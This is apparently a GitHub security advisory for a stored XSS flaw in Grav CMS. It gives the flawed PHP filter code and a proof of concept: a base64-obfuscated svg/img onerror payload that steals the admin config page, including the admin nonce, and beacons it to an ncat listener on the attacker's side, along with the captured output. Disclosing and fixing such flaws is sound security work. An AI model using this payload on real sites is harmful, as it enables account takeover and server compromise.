# [H] Grav is Vulnerable to Stored XSS via Tag Injection

## Summary
Severity: High
Advisory: GHSA-w8cg-7jcj-4vv2
CVE: CVE-2026-42611
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-w8cg-7jcj-4vv2
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-beta.2

## Details
### Summary
A low-privileged (with the ability to create a page) user can cause XSS with the injection of `svg` element. The XSS can further be escalated to dump the entire system information available under `/admin/config/info` whenever a Super Admin visits the page; which can further be chained with the use of admin-nonce to do a complete server compromise (RCE).

### Details
Affected endpoint: `admin/pages/<page>`
Affected code: `system/src/Grav/Common/Security.php`

```php
    public static function detectXss($string, array $options = null): ?string
    {
        // Skip any null or non string values
        if (null === $string || !is_string($string) || empty($string)) {
            return null;
        }

        if (null === $options) {
            $options = static::getXssDefaults();
        }

        $enabled_rules = (array)($options['enabled_rules'] ?? null);
        $dangerous_tags = (array)($options['dangerous_tags'] ?? null);
        if (!$dangerous_tags) {
            $enabled_rules['dangerous_tags'] = false;
        }
        $invalid_protocols = (array)($options['invalid_protocols'] ?? null);
        if (!$invalid_protocols) {
            $enabled_rules['invalid_protocols'] = false;
        }
        $enabled_rules = array_filter($enabled_rules, static function ($val) { return !empty($val); });
        if (!$enabled_rules) {
            return null;
        }

        // Keep a copy of the original string before cleaning up
        $orig = $string;

        // URL decode
        $string = urldecode($string);

        // Convert Hexadecimals
        $string = (string)preg_replace_callback('!(&#|\\\)[xX]([0-9a-fA-F]+);?!u', static function ($m) {
            return chr(hexdec($m[2]));
        }, $string);

        // Clean up entities
        $string = preg_replace('!(&#[0-9]+);?!u', '$1;', $string);

        // Decode entities
        $string = html_entity_decode($string, ENT_NOQUOTES | ENT_HTML5, 'UTF-8');

        // Strip whitespace characters
        $string = preg_replace('!\s!u', ' ', $string);
        $stripped = preg_replace('!\s!u', '', $string);

        // Set the patterns we'll test against
        $patterns = [
            // Match any attribute starting with "on" or xmlns
            'on_events' => '#(<[^>]+[a-z\x00-\x20\"\'\/])(on[a-z]+|xmlns)\s*=[\s|\'\"].*[\s|\'\"]>#iUu',

            // Match javascript:, livescript:, vbscript:, mocha:, feed: and data: protocols
            'invalid_protocols' => '#(' . implode('|', array_map('preg_quote', $invalid_protocols, ['#'])) . ')(:|\&\#58)\S.*?#iUu',

            // Match -moz-bindings
            'moz_binding' => '#-moz-binding[a-z\x00-\x20]*:#u',

            // Match style attributes
            'html_inline_styles' => '#(<[^>]+[a-z\x00-\x20\"\'\/])(style=[^>]*(url\:|x\:expression).*)>?#iUu',

            // Match potentially dangerous tags
            'dangerous_tags' => '#</*(' . implode('|', array_map('preg_quote', $dangerous_tags, ['#'])) . ')[^>]*>?#ui'
        ];

        // Iterate over rules and return label if fail
        foreach ($patterns as $name => $regex) {
            if (!empty($enabled_rules[$name])) {
                if (preg_match($regex, $string) || preg_match($regex, $stripped) || preg_match($regex, $orig)) {
                    return $name;
                }
            }
        }

        return null;
    }
```

Specifically the line:

```php
'on_events' => '#(<[^>]+[a-z\x00-\x20\"\'\/])(on[a-z]+|xmlns)\s*=[\s|\'\"].*[\s|\'\"]>#iUu',
```

assumes that the on_events will always begin with either `whitespace, ', "` which can easily be bypassed with a simple payload like:

`<img src=x onload=alert('1')>`

This XSS Filter practice is broken.
1. Blacklisting every possible scenario that leads to XSS isn't possible.
2. Regex can't parse HTML.

It would be better to use an HTMLPurifier.
### PoC
Grav Core + Admin Plugin
Grav Version: `v1.7.49.5 - Admin v1.10.49.1`

1. Create a low-privileged user with only enough permission to login and perform CRUD on Pages.
![User Perms](https://imgur.com/VkhtE9L.png)

2. Login as the low-privileged user and browse to pages:
![Pages](https://imgur.com/4bmmozN.png)

3. Create a post with the following content:
```
<svg><foreignObject><img src=x onerror=eval(atob('KGFzeW5jKCk9PntsZXQgcj1hd2FpdCBmZXRjaCgnL2dyYXYtYWRtaW4vYWRtaW4vY29uZmlnL2luZm8nKTtsZXQgdD1hd2FpdCByLnRleHQoKTtuYXZpZ2F0b3Iuc2VuZEJlYWNvbignaHR0cDovLzEyNy4wLjAuMTo4MDAxL2dyYXYtbG9nJyx0KX0pKCk7'))></foreignObject></svg>
```

The payload base64 is decoded to: 

```javascript
(async()=>{let r=await fetch('/grav-admin/admin/config/info');let t=await r.text();navigator.sendBeacon('http://127.0.0.1:8001/grav-log',t)})();
```

whenever a user with enough privilege visits the attacker-controlled page, a request will be made to the `info` endpoint and the response will be sent to attacker beacon/listener.

4. Save
![Post Created](https://imgur.com/o33Erj2.png)

5. Start a `ncat` listener on port `8001`.

```bash
┌──(kali㉿kali)-[~]
└─$ ncat -lvnp 8001
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:8001
Ncat: Listening on [0.0.0.0:8001](http://0.0.0.0:8001/)
Ncat: Connection from [127.0.0.1:44658](http://127.0.0.1:44658/).
```

6. Now as a Super Admin visit the `/` of Grav `[http://localhost/grav-admin/`](http://localhost/grav-admin/) for me:
![Visiting Grav](https://imgur.com/kjt7uc9.png)

7. We get a response with the `admin-nonce` and the entire system information:

```
┌──(kali㉿kali)-[~]
└─$ ncat -lvnp 8001
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:8001
Ncat: Listening on [0.0.0.0:8001](http://0.0.0.0:8001/)
Ncat: Connection from [127.0.0.1:44658](http://127.0.0.1:44658/).
POST /grav-log HTTP/1.1
Host: [127.0.0.1:8001](http://127.0.0.1:8001/)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: text/plain;charset=UTF-8
Content-Length: 127013
Origin: http://localhost/
Connection: keep-alive
Referer: http://localhost/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
Priority: u=6

    <!DOCTYPE html>
    <html lang="en">
    <head>
            <meta charset="utf-8" />
        <title>Configuration: Info | Grav</title>
                    <meta name="description" content="">
                            <meta name="robots" content="noindex, nofollow">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/png" href="/grav-admin/user/plugins/admin/themes/grav/images/favicon.png">

                                   

       
        <script type="text/javascript">
    window.GravAdmin = window.GravAdmin || {};
    window.GravAdmin.config = {
        current_url: '/grav-admin/admin/config/info',
        base_url_relative: '/grav-admin/admin',
        base_url_simple: '/grav-admin',
        route: 'info',
        param_sep: ':',
                enable_auto_updates_check: '1',
                admin_timeout: '1800',
        admin_nonce: '1265db72d897b4324cbe7d1781e66e3b',
       
       
<SNIPPED>
```

### Impact

This is a **Stored Cross-Site Scripting (XSS)** vulnerability exploitable by a low-privileged user, which leads to **exfiltration of the admin session context**, including the **`admin_nonce`**. This nonce can be abused to **bypass CSRF protections** and **authenticate further requests** to sensitive admin endpoints. Given Grav’s support for **scheduled tasks** and extensible plugin architecture, this can be escalated to **Remote Code Execution (RCE)** under favorable conditions.

**Affected Component**: Grav Core + Admin Plugin (`v1.7.49.5` / `v1.10.49.1`)  
**Impact**: Full system compromise via RCE chain originating from low-privilege XSS.

`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H`
`Overall CVSS Score: 9.0`
`High Impact`

---


---

## Maintainer note — fix applied (2026-04-24)

Fixed in Grav core on the `2.0` branch: commit [`5a12f9be8`](https://github.com/getgrav/grav/commit/5a12f9be8) — will ship in **2.0.0-beta.2**. Two changes in tandem:

1. **Regex bypass** (detection layer) — the `on_events` regex that missed unquoted handlers is tightened; see the companion GHSA-9695-8fr9-hw5q advisory for details.

2. **Missing dangerous tags** — `svg`, `math`, `option`, and `select` have been added to default `security.xss_dangerous_tags` in [`system/config/security.yaml`](https://github.com/getgrav/grav/blob/2.0/system/config/security.yaml). `svg` and `math` allow inline scripting through their XML namespace and event-handler surface; `option`/`select` are the tags attackers use to break out of the admin's select-template context before dropping the payload.

Combined with the tightened `on_events` regex, the PoC `<svg>…<script>…</script></svg>` (and the GHSA-c2q3 `</option></select><img src=x onerror=alert(1)>` variant) now trip at least one detector.

**Files:**
- [`system/config/security.yaml`](https://github.com/getgrav/grav/blob/2.0/system/config/security.yaml) — dangerous-tags list extended.
- [`system/src/Grav/Common/Security.php`](https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Security.php) — regex tightening.
- [`tests/unit/Grav/Common/Security/DetectXssTest.php`](https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/DetectXssTest.php).

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-w8cg-7jcj-4vv2
- https://nvd.nist.gov/vuln/detail/CVE-2026-42611
- https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663
- https://github.com/getgrav/grav
